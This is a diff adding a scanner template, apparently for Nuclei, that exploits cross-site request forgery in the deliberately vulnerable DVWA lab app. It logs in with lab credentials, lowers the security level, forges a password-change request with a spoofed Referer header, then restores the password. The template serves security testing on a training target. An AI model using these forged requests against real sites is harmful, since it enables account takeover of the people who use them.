@@ -1,0 +1,96 @@
+id: dvwa-cross-site-request-forgery-medium-sec
+
+info:
+  name: DVWA Cross-Site Request Forgery User 1337 - medium sec (Authenticated)
+  author: Dylan Shield (Shieldia.co)
+  severity: high
+  description: Attempts to exploit CSRF on DVWA after authentication.
+  reference:
+    - https://github.com/digininja/DVWA
+  tags: dvwa,csrf
+
+variables:
+  userpass_old: "charley"
+  userpass_new: "asdf"
+  username: "1337"
+
+flow: http(1) && http(2) && http(3) && http(4)
+
+http:
+  # Step 1: Authenticate as 1337 and get PHPSESSID and user_token
+  - raw:
+      - |
+        GET /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+      - |
+        POST /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        username={{username}}&password={{userpass_old}}&Login=Login&user_token={{token}}
+    
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        part: body
+        regex:
+          - "name='user_token' value='([a-f0-9]+)'"
+        internal: true
+
+  # Step 2: Set Security Level to Medium
+  - raw:
+      - |
+        POST /DVWA/security.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        security=medium&seclev_submit=Submit&user_token={{token}}
+
+  # Step 3: Execute Cross-Site Request Forgery
+  - raw:
+      - |
+        GET /DVWA/vulnerabilities/csrf/?password_new={{userpass_new}}&password_conf={{userpass_new}}&Change=Change# HTTP/1.1
+        Referer: http://tartarus-dvwa.home.arpa/DVWA/vulnerabilities/csrf/
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        name: "Password changed to a new password."
+        part: body
+        words:
+          - "Password Changed."
+  
+  # Step 4: Change the password back
+  - raw:
+      - |
+        GET /DVWA/vulnerabilities/csrf/?password_new={{userpass_old}}&password_conf={{userpass_old}}&Change=Change# HTTP/1.1
+        Referer: http://tartarus-dvwa.home.arpa/DVWA/vulnerabilities/csrf/
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        name: "Password changed back to original."
+        part: body
+        words:
+        - "Password Changed."
+
